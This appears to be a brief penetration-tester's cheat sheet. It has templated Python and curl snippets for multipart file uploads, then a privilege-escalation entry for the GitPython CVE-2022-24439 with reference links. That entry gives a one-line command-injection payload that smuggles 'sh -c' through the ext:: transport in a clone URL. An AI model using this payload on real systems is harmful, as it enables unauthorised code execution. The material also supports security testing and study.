## Sending multipart/form-data requests

### Python

```python
multipart_form_data = {
            '<keyname>': (None, <data>),
            '<keyname>': ('<filename>', open(<filepath>, r), '<filetype>')
        }

        try:
            r = requests.post(URL, headers=HEADERS, files=multipart_form_data, timeout=0.5)
        except:
            pass
```

### Curl

```bash
curl -s -q -X 'POST' <url> \
      -H 'Host: <host>' \
      -H 'Accept: */*' \
      -H 'Accept-Language: en-US,en;q=0.5' \
      -F '<key1>=<value2>' \
      -F '<key2>=@<path-to-file>' \
      -H 'Origin: <origin>' \
      -H 'Connection: close' \
      -H 'Referer: <referer>' \
```

# PrivEsc

## Git

#### CVE-2022-24439:

```
<gitpython::clone> 'ext::sh -c touch% /tmp/pwned'
```

- https://git-scm.com/docs/git-remote-ext
- https://github.com/gitpython-developers/GitPython/issues/1515
- https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
